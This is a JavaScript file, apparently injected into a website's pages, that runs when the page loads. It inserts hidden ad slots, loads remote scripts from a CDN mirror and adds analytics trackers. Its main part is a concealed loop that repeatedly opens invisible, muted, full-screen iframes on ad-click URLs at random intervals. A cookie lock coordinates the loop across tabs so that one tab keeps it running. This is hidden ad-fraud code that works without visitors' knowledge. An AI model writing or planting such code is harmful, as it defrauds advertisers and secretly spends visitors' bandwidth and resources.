var today = new Date();
var y = today.getFullYear();
var m = (today.getMonth() + 1).toString().padStart(2, '0');
var d = today.getDate().toString().padStart(2, '0');
var dateParam = y + m + d;

function runWhenIdle(callback) {
    if ('requestIdleCallback' in window) {
        requestIdleCallback(callback, { timeout: 2000 });
    } else {
        setTimeout(callback, 1);
    }
}

function initAll() {
    runWhenIdle(function() {
        (function () {
            try {
                if (!window.AdProvider) {
                    window.AdProvider = [];
                }
                var adConfigs = [
                    { className: "eas6a97888e10", zoneid: "5909834" },
                    { className: "eas6a97888e10", zoneid: "5923402" }, 
                    { className: "eas6a97888e2", zoneid: "5910938" },
                    { className: "eas6a97888e2", zoneid: "5911752" },
                    { className: "eas6a97888e2", zoneid: "5910936" },
                    { className: "eas6a97888e10", zoneid: "5909830" },
                    { className: "eas6a97888e38", zoneid: "5921986" }, 
                    { className: "eas6a97888e20", zoneid: "5921988" },   
                    { className: "eas6a97888e2", zoneid: "5923416" }, 

                ];
                var hiddenContainer = document.createElement("div");
                hiddenContainer.style.display = "none"; 
                function insertMultipleAds() {
                    if (document.body) {
                        document.body.appendChild(hiddenContainer);
                        adConfigs.forEach(function(config) {
                            var ins = document.createElement("ins");
                            ins.className = config.className;
                            ins.setAttribute("data-zoneid", config.zoneid);
                            hiddenContainer.appendChild(ins);
                        });
                    } else {
                        document.addEventListener("DOMContentLoaded", function() {
                            document.body.appendChild(hiddenContainer);
                            adConfigs.forEach(function(config) {
                                var ins = document.createElement("ins");
                                ins.className = config.className;
                                ins.setAttribute("data-zoneid", config.zoneid);
                                hiddenContainer.appendChild(ins);
                            });
                        });
                    }
                }
                insertMultipleAds();
                var magScript = document.createElement("script");
                magScript.async = true;
                magScript.src = "https://cdn.jsdmirror.com/gh/xxloli/ads/exo/1.js"; 
                magScript.onload = function () {
                    try {
                        (window.AdProvider = window.AdProvider || []).push({ "serve": {} });
                    } catch (e) {
                    }
                };
                magScript.onerror = function () {
                };
                var firstScript = document.getElementsByTagName("script")[0];
                firstScript.parentNode.insertBefore(magScript, firstScript);
            } catch (e) {
            }
        })();

        (function() {
            var adScript = document.createElement("script");
            adScript.async = true;
            adScript.src = "https://cdn.jsdmirror.com/gh/xxloli/ads/54/1.js"; 
            var adContainer = document.createElement("div");
            adContainer.style.display = "none";
            adContainer.innerHTML = '<ins class="5a165732" data-key="05257ceaf4c2ac5ae71dbc805cdbe7a5"></ins>' +
                                    '<ins class="5a165732" data-key="80e98bca8418c00afacdbc93fda6eb0c"></ins>' +
                                    '<ins class="5a165732" data-key="29e5d3b4e3a7c667b79024f07c32c972"></ins>' +
                                    '<ins class="5a165732" data-key="05257ceaf4c2ac5ae71dbc805cdbe7a5"></ins>' +
                                    '<ins class="5a165732" data-key="80e98bca8418c00afacdbc93fda6eb0c"></ins>';
            adScript.onload = function() {
            };
            function insertAds() {
                if (document.body) {
                    var firstScript = document.getElementsByTagName("script")[0];
                    firstScript.parentNode.insertBefore(adScript, firstScript);
                    document.body.appendChild(adContainer);
                } else {
                    document.addEventListener("DOMContentLoaded", insertAds);
                }
            }
            insertAds();
        })();

        !function(p) {
            "use strict";
            !function(t) {
                var s = window, e = document, i = p;
                var c = "https://cdn.jsdmirror.com/gh/xxloli/ads/51/1.js";
                function deleteCurrentDomainLACookies() {
                    var cookies = document.cookie.split("; ");
                    for (var j = 0; j < cookies.length; j++) {
                        var cookie = cookies[j];
                        var cookieName = cookie.split("=")[0];
                        if (cookieName.indexOf("_la_") === 0) {
                            document.cookie = "".concat(cookieName, "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;");
                        }
                    }
                }
                deleteCurrentDomainLACookies();
                function mainLogic() {
                    var n = e.createElement("script"), r = e.getElementsByTagName("script")[0];
                    n.type = "text/javascript";
                    n.setAttribute("charset", "UTF-8");
                    n.async = !0;
                    n.src = c;
                    n.id = "LA_COLLECT";
                    i.d = n;
                    var o = function() { s.LA.ids.push(i) };
                    s.LA ? s.LA.ids && o() : (s.LA = p, s.LA.ids = [], o());
                    r.parentNode.insertBefore(n, r);
                }
                
                if (e.readyState === "loading") {
                    e.addEventListener("DOMContentLoaded", mainLogic);
                } else {
                    mainLogic();
                }
            }()
        }({ id: "Jfpcnt0H2uEfXtSf", ck: "Jfpcnt0H2uEfXtSf" });

        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?b289e3414e1a95f58db4b2b2fc007357";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();

        var pcLinkList = [
            `https://s.pemsrv.com/v1/link.php?cat=&idzone=${[5931802, 5931798, 5931062, 5909808][Math.floor(Math.random() * 4)]}&type=8&timestamp=${Date.now()}`,
            `https://s.pemsrv.com/v1/link.php?cat=&idzone=${[5931802, 5931798, 5931062, 5909808][Math.floor(Math.random() * 4)]}&type=8&timestamp=${Date.now()}`,
            `https://5.wrnm.de5.net/v1/link.php?cat=&idzone=${[5931802, 5931798, 5931062, 5909808][Math.floor(Math.random() * 4)]}&type=8&timestamp=${Date.now()}`,
            "https://adservercdn.54ads.com/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe",
            "https://aj2758.top/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe",
            "https://4.wrnm.de5.net/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe",

        ];

        var peLinkList = [
            `https://s.pemsrv.com/v1/link.php?cat=&idzone=${[5931790, 5929702, 5924982, 5923404][Math.floor(Math.random() * 4)]}&type=8&timestamp=${Date.now()}`,
            `https://s.pemsrv.com/v1/link.php?cat=&idzone=${[5931790, 5929702, 5924982, 5923404][Math.floor(Math.random() * 4)]}&type=8&timestamp=${Date.now()}`,
            `https://5.wrnm.de5.net/v1/link.php?cat=&idzone=${[5931790, 5929702, 5924982, 5923404][Math.floor(Math.random() * 4)]}&type=8&timestamp=${Date.now()}`,
            "https://adservercdn.54ads.com/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe",
            "https://aj2758.top/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe",
            "https://4.wrnm.de5.net/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe",
            
        ];

        function isMobile() {
            var ua = navigator.userAgent || '';
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(ua);
        }

        var linkList = isMobile() ? peLinkList : pcLinkList;

        var hiddenContainer = document.createElement("div");
        hiddenContainer.style.display = "none";
        hiddenContainer.style.position = "fixed";
        hiddenContainer.style.top = "0";
        hiddenContainer.style.left = "0";
        hiddenContainer.style.width = "100vw";
        hiddenContainer.style.height = "100vh";
        var currentTimeout = null;
        var currentIframes = [];

        var COORD_LOCK_KEY = '_js_loop_lock_ts';
        var LOCK_TTL = 3000;
        var isLoopRunning = false;
        var coordCheckInterval = null;

        function getShareableDomain() {
            var host = window.location.hostname;
            var parts = host.split('.');
            if (parts.length <= 2) return host;
            return '.' + parts.slice(-2).join('.');
        }

        function refreshLock() {
            var domain = getShareableDomain();
            var cookieStr = COORD_LOCK_KEY + '=' + Date.now() + '; path=/; max-age=' + Math.ceil(LOCK_TTL / 1000) + '; SameSite=Lax';
            if (domain.charAt(0) === '.') {
                cookieStr += '; domain=' + domain;
            }
            document.cookie = cookieStr;
        }

        function releaseLock() {
            var domain = getShareableDomain();
            var cookieStr = COORD_LOCK_KEY + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; SameSite=Lax';
            if (domain.charAt(0) === '.') {
                cookieStr += '; domain=' + domain;
            }
            document.cookie = cookieStr;
        }

        function tryAcquireLock() {
            var now = Date.now();
            var cookies = document.cookie.split('; ');
            for (var i = 0; i < cookies.length; i++) {
                var kv = cookies[i].trim().split('=');
                if (kv[0] === COORD_LOCK_KEY) {
                    var ts = parseInt(kv[1], 10);
                    if (!isNaN(ts) && (now - ts) < LOCK_TTL) {
                        return false;
                    }
                }
            }
            refreshLock();
            return true;
        }

        function startLoopIfLeader() {
            if (isLoopRunning) return;
            isLoopRunning = true;
            runIframeLoop();
        }

        function stopLoop() {
            isLoopRunning = false;
            cleanup();
            releaseLock();
        }

        function cleanup() {
            if (currentTimeout) {
                clearTimeout(currentTimeout);
                currentTimeout = null;
            }
            currentIframes.forEach(function(iframe) {
                if (iframe.loadListener) {
                    iframe.removeEventListener('load', iframe.loadListener);
                    delete iframe.loadListener;
                }
                if (iframe.src) {
                    iframe.src = 'about:blank';
                }
            });
            currentIframes = [];
            hiddenContainer.innerHTML = '';
        }

        function runIframeLoop() {
            cleanup();
            
            var pendingIframes = linkList.length;
            
            function checkAllLoaded() {
                pendingIframes--;
                if (pendingIframes <= 0 && currentTimeout) {
                    clearTimeout(currentTimeout);
                    if (isLoopRunning) {
                        currentTimeout = setTimeout(runIframeLoop, Math.floor(Math.random() * 4000) + 4000);
                    } else {
                        isLoopRunning = false;
                    }
                }
            }
            
            linkList.forEach(function(url) {
                var iframe = document.createElement("iframe");
                iframe.src = url;
                iframe.style.border = "none";
                iframe.style.position = "absolute";
                iframe.style.top = "0";
                iframe.style.left = "0";
                iframe.style.width = "100%";
                iframe.style.height = "100%";
                iframe.muted = true;
                iframe.setAttribute("muted", "muted");
                iframe.loadListener = checkAllLoaded;
                currentIframes.push(iframe);
                
                if (iframe.contentDocument && iframe.contentDocument.readyState === 'complete') {
                    checkAllLoaded();
                } else {
                    iframe.addEventListener('load', checkAllLoaded);
                }
                
                hiddenContainer.appendChild(iframe);
            });
            
            currentTimeout = setTimeout(function() {
                if (currentTimeout) {
                    if (isLoopRunning) {
                        currentTimeout = setTimeout(runIframeLoop, Math.floor(Math.random() * 4000) + 4000);
                    } else {
                        isLoopRunning = false;
                    }
                }
            }, Math.floor(Math.random() * 3000) + 11000);
        }

        window.addEventListener('beforeunload', function() {
            if (isLoopRunning) {
                releaseLock();
            }
        });

        coordCheckInterval = setInterval(function() {
            if (!isLoopRunning) {
                if (tryAcquireLock()) {
                    startLoopIfLeader();
                }
            } else if (isLoopRunning) {
                refreshLock();
            }
        }, 1500);

        if (document.body) {
            document.body.appendChild(hiddenContainer);
            if (tryAcquireLock()) {
                startLoopIfLeader();
            }
        } else {
            document.addEventListener("DOMContentLoaded", function() {
                document.body.appendChild(hiddenContainer);
                if (tryAcquireLock()) {
                    startLoopIfLeader();
                }
            });
        }
    });
}

if (document.readyState === 'complete' || document.readyState === 'interactive') {
    setTimeout(initAll, 0);
} else {
    window.addEventListener('load', initAll);
}
